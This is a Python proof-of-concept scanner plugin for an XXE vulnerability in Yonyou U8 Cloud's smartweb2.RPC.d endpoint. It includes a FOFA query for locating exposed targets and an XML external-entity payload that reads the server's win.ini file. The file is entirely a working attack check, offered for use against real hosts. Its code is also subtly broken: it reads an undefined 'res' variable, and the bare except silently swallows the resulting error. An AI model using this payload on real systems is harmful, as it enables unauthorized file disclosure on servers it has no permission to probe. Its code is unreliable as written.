#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/gjvxvLazfDYULXFEa4j66g',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '用友U8 Cloud smartweb2.RPC.d 存在XXE',

      'level'     :   'high',

      'FOFA'      :   'app="用友-U8-Cloud"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/4/8',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
      'Accept-Encoding': 'gzip, deflate',
      'Accept-Language': 'zh-CN,zh;q=0.9',
      'Content-Type':' application/x-www-form-urlencoded',
      }
  target = '/hrss/dorado/smartweb2.RPC.d?__rpc=true'
  body = '__viewInstanceId=nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel&__xml=<!DOCTYPE z [<!ENTITY Password SYSTEM "file:///C://windows//win.ini" >]><rpc transaction="10" method="resetPwd"><vps><p name="__profileKeys">%26Password;</p ></vps></rpc>'
  url1 = url + target
  ret['url'] = url1
  try:
    resp=requests.post(url=url1,headers=headers,data=body,timeout=5,verify=False)
    if resp.status_code == 200 and re.search(r'for 16-bit app support',res.text,re.S):
      # ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret